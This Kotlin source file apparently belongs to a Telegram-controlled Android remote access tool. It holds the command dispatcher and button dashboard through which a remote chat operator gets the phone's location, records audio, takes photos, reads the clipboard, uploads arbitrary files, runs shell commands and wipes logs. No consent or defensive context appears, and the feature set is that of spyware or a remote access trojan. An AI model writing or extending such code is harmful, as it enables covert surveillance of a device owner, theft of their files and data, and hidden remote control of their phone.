package com.example.telegramlistener.service

import com.example.telegramlistener.data.repo.EventRepository
import com.example.telegramlistener.data.remote.InlineKeyboardMarkup
import com.example.telegramlistener.data.remote.InlineKeyboardButton
import com.example.telegramlistener.data.remote.Update
import javax.inject.Inject
import android.util.Log

class CommandProcessor @Inject constructor(
    private val repository: EventRepository
) {

    interface CommandCallback {
        fun onRecordAudio(duration: Int)
        fun stopRecording()
        fun wipeLogs()
        fun setVolume(percent: Int)
        fun getLocation(): String
        fun getNetworkInfo(): String
        fun getMemoryInfo(): String
        fun setFlashlight(on: Boolean)
        fun vibrate(duration: Long)
        fun speakText(text: String)
        fun showAlert(text: String)
        fun listApps(): String
        fun launchApp(appName: String): String
        fun listFiles(path: String): String
        fun sendFile(path: String)
        fun takePhoto(camId: String = "0")
        fun shell(cmd: String): String
        fun getClipboard(): String
        fun getStatus(): String
    }

    suspend fun processUpdate(update: Update, callback: CommandCallback) {
        val (token, authorizedChatId) = repository.getConfig()
        
        // Handle Callback Queries (Button Clicks)
        update.callback_query?.let { query ->
            val chatId = query.message?.chat?.id?.toString() ?: ""
            Log.d("CommandProcessor", "Callback from chat: $chatId, auth: $authorizedChatId")
            if (chatId != authorizedChatId) return@let
            
            // For callbacks on forum topics, message_thread_id is inside the message
            val threadId = query.message?.message_thread_id
            handleCommand(query.data ?: "", callback, threadId, isCallback = true)
            
            // Acknowledge callback (optional but good practice)
            // repository.answerCallbackQuery(query.id) 
        }

        // Handle Slash Commands
        update.message?.let { msg ->
            val chatId = msg.chat.id.toString()
            Log.d("CommandProcessor", "Message from chat: $chatId, auth: $authorizedChatId")
            if (chatId != authorizedChatId) return@let
            
            val text = msg.text ?: return@let
            handleCommand(text, callback, msg.message_thread_id, isCallback = false)
        }
    }

    private suspend fun handleCommand(text: String, callback: CommandCallback, threadId: Int?, isCallback: Boolean) {
        Log.d("CommandProcessor", "Handling command: $text (Thread: $threadId)")
        val parts = text.trim().split("\\s+".toRegex())
        val cmd = parts[0].split("@")[0].lowercase()
        val args = parts.drop(1)

        when (cmd) {
            "/start", "/help", "menu", "refresh" -> showDashboard(callback, threadId)
            "/status", "status" -> updateStatus(callback, threadId)
            "/location", "location" -> sendResponse(callback.getLocation(), threadId)
            "/flashlight_on", "flashlight_on" -> {
                callback.setFlashlight(true)
                updateStatus(callback, threadId, "🔦 Flashlight ON")
            }
            "/flashlight_off", "flashlight_off" -> {
                callback.setFlashlight(false)
                updateStatus(callback, threadId, "🔦 Flashlight OFF")
            }
            "/vibrate", "vibrate" -> {
                callback.vibrate(1000)
                sendResponse("📳 Vibrating...", threadId)
            }
            "/say" -> {
                val sayText = args.joinToString(" ")
                if (sayText.isNotEmpty()) {
                    callback.speakText(sayText)
                    sendResponse("🗣 Speaking: \"$sayText\"", threadId)
                }
            }
            "/record_audio", "record" -> {
                callback.onRecordAudio(10)
                sendResponse("🎙 Recording 10s...", threadId)
            }
            "/stop", "stop" -> {
                callback.stopRecording()
                sendResponse("🛑 Operations Halted.", threadId)
            }
            "apps" -> sendResponse("📦 *Apps:*\n`${callback.listApps()}`", threadId)
            "network" -> sendResponse(callback.getNetworkInfo(), threadId)
            "memory" -> sendResponse(callback.getMemoryInfo(), threadId)
            "/wipe" -> {
                callback.wipeLogs()
                sendResponse("🧹 Logs Wiped.", threadId)
            }
            "/photo", "photo" -> {
                callback.takePhoto()
                sendResponse("📸 Capturing photo...", threadId)
            }
            "/get" -> {
                if (args.isNotEmpty()) {
                    callback.sendFile(args.joinToString(" "))
                    sendResponse("📤 Uploading file...", threadId)
                } else {
                    sendResponse("❌ Usage: /get <path>", threadId)
                }
            }
            "/shell" -> {
                if (args.isNotEmpty()) {
                    val result = callback.shell(args.joinToString(" "))
                    sendResponse("💻 *Shell Output:*\n```$result```", threadId)
                } else {
                    sendResponse("❌ Usage: /shell <cmd>", threadId)
                }
            }
            "/clipboard" -> sendResponse("📋 *Clipboard:*\n`${callback.getClipboard()}`", threadId)
            "/close", "/delete_thread" -> {
                if (threadId != null && threadId != 0) {
                    sendResponse("🗑 Deleting thread...", threadId)
                    repository.deleteTopic(threadId)
                } else {
                    sendResponse("❌ Cannot delete main thread.", threadId)
                }
            }
            else -> {
                if (!isCallback) sendResponse("❓ Unknown command: `$cmd`", threadId)
            }
        }
    }

    private suspend fun showDashboard(callback: CommandCallback, threadId: Int?) {
        val text = getDashboardText(callback)
        val markup = getDashboardMarkup()
        
        val dashboardId = repository.getLastDashboardId()
        val storedThreadId = repository.getLastDashboardThreadId()
        
        // Only edit if we are in the same thread
        var success = false
        if (dashboardId != 0L && storedThreadId == (threadId ?: 0)) {
            success = repository.editMessage(dashboardId, text, markup)
        }
        
        if (!success) {
            val msg = repository.sendMessage(text, threadId, markup)
            msg?.let { 
                repository.setLastDashboardId(it.message_id) 
                repository.setLastDashboardThreadId(threadId ?: 0)
            }
        }
    }

    private suspend fun updateStatus(callback: CommandCallback, threadId: Int?, extra: String? = null) {
        val dashboardId = repository.getLastDashboardId()
        val storedThreadId = repository.getLastDashboardThreadId()
        
        // If no dashboard or wrong thread, show new dashboard
        if (dashboardId == 0L || storedThreadId != (threadId ?: 0)) {
            showDashboard(callback, threadId)
            return
        }

        val text = getDashboardText(callback) + (extra?.let { "\n\n$it" } ?: "")
        val markup = getDashboardMarkup()
        
        val success = repository.editMessage(dashboardId, text, markup)
        if (!success) {
            // If edit failed, resend
            val msg = repository.sendMessage(text, threadId, markup)
            msg?.let { 
                repository.setLastDashboardId(it.message_id)
                repository.setLastDashboardThreadId(threadId ?: 0)
            }
        }
    }

    private suspend fun sendResponse(text: String, threadId: Int?) {
        // For quick responses, we just send a message, or we could update dashboard
        // Let's send a new message for discrete data like GPS coords to keep them visible
        repository.sendMessage(text, threadId)
    }

    private fun getDashboardText(callback: CommandCallback): String {
        return """
            📡 *COMMANDER DASHBOARD*
            ────────────────────
            ${callback.getStatus()}
            ────────────────────
            ⏰ _Last Sync: ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}_
        """.trimIndent()
    }

    private fun getDashboardMarkup(): InlineKeyboardMarkup {
        return InlineKeyboardMarkup(
            inline_keyboard = listOf(
                listOf(
                    InlineKeyboardButton("🔄 Refresh", callback_data = "refresh"),
                    InlineKeyboardButton("📍 Locate", callback_data = "location")
                ),
                listOf(
                    InlineKeyboardButton("🔦 Torch ON", callback_data = "flashlight_on"),
                    InlineKeyboardButton("🔦 Torch OFF", callback_data = "flashlight_off")
                ),
                listOf(
                    InlineKeyboardButton("🎙 Record", callback_data = "record"),
                    InlineKeyboardButton("🛑 Stop", callback_data = "stop")
                ),
                listOf(
                    InlineKeyboardButton("📦 Apps", callback_data = "apps"),
                    InlineKeyboardButton("📶 Net", callback_data = "network"),
                    InlineKeyboardButton("💾 Mem", callback_data = "memory")
                ),
                listOf(
                    InlineKeyboardButton("📳 Vibrate", callback_data = "vibrate"),
                    InlineKeyboardButton("🧹 Wipe", callback_data = "wipe")
                ),
                listOf(
                    InlineKeyboardButton("📸 Photo", callback_data = "photo")
                )
            )
        )
    }
}
